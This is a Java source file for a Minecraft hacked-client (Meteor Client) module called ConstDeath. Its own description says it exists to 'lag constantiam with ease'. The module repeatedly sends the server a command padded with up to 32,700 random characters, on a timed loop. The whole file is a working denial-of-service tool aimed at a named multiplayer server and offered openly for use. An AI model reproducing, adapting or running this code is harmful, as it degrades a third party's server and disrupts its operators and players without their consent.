package pictures.cunny.kraken;

import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class ConstDeath extends Module {
    private final SettingGroup sgDefault = settings.getDefaultGroup();
    private final Setting<String> command =
            sgDefault.add(
                    new StringSetting.Builder()
                            .name("command")
                            .description("The command to run, no /.")
                            .defaultValue("w <self>")
                            .build());
    private final Setting<Boolean> randomizer =
            sgDefault.add(
                    new BoolSetting.Builder()
                            .name("randomizer")
                            .description("If active will use randomized ascii.")
                            .defaultValue(true)
                            .build());
    private final Setting<Integer> length =
            sgDefault.add(
                    new IntSetting.Builder()
                            .name("length")
                            .description("How many random characters to add.")
                            .defaultValue(32700)
                            .sliderRange(1, 32767)
                            .build());
    private final Setting<Integer> delay =
            sgDefault.add(
                    new IntSetting.Builder()
                            .name("delay")
                            .description("Delay in ticks.")
                            .defaultValue(80)
                            .sliderRange(0, 120)
                            .build());

    private int ticks = 0;

    public ConstDeath() {
        super(Categories.Misc, "const-death", "Lag constantiam with ease.");
    }

    public static String generateIdentifier() {
        ConstDeath module = Modules.get().get(ConstDeath.class);

        String msg = module.command.get();

        assert MeteorClient.mc.player != null;

        msg = msg.replace("<self>", MeteorClient.mc.getSession().getUsername());

        if (module.randomizer.get()) {
            msg += " " + StringUtils.randomText(module.length.get());
        }

        return msg;
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        if (mc.player == null) {
            return;
        }

        if (ticks < delay.get()) {
            ticks++;
            return;
        }

        ticks = 0;

        mc.player.networkHandler.sendPacket(
                new CommandExecutionC2SPacket(generateIdentifier().trim()));
    }

}
